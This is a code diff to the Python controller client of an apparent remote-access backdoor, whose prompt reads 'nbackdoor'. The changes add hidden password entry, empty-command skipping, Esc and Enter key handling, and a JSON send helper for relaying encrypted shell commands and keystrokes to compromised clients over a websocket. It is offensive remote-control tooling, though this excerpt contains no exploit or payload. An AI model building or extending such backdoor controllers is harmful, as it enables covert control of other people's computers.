@@ -8,13 +8,12 @@ from colorama import Fore, Back, Style
 import uuid
 import json
 import time
-# from getpass import getpass
+from getpass import getpass
 from base64 import b64decode, b64encode
 import sys
 import msvcrt
 from websocket import create_connection
 from Crypto.Cipher import AES
-from _docpot import docopt
 __author__ = 'nekocode'
 
 
@@ -50,7 +49,7 @@ class ControllerClient:
                 # =====================
                 # ======= Login =======
                 # =====================
-                pwd = raw_input('Enter the password: ')
+                pwd = getpass('Enter the password: ')
 
                 try:
                     sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET),
@@ -77,9 +76,12 @@ class ControllerClient:
                     input_str = raw_input(Back.RED + 'nbackdoor' +
                                           ((' in ' + str(self.to_client) + '') if self.to_client is not None else '') +
                                           ':' + Back.RESET + ' ')
+
                     if input_str == 'exit':
                         self.exit = True
                         break
+                    elif input_str.strip() == '':
+                        continue
 
                     msg = json.dumps({'cmd': b64encode(input_str)})
                     self.ws.send_binary(self.encrypt(msg))
@@ -88,11 +90,18 @@ class ControllerClient:
                     OutputReceiver(self)
 
                     while True:
-                        char = msvcrt.getch()
+                        char = msvcrt.getwch()
                         if not self.is_cmd_running:
                             break
 
-                        self.send_char(char)
+                        if char == '\r':            # todo
+                            self.send_char('\r')
+                        elif char == '\x1b':        # Key Esc
+                            self.send_char('\x1b')
+                            while self.is_cmd_running:
+                                time.sleep(0.1)
+                        else:
+                            self.send_char(char)
 
                 self.ws.close()
 
@@ -115,6 +124,9 @@ class ControllerClient:
 
     def send_char(self, char):
         self.ws.send_binary(self.encrypt(json.dumps({'char': b64encode(char)})))
+
+    def send_json(self, jsonobj):
+        self.ws.send_binary(self.encrypt(json.dumps(jsonobj)))
 
 
 class OutputReceiver(threading.Thread):
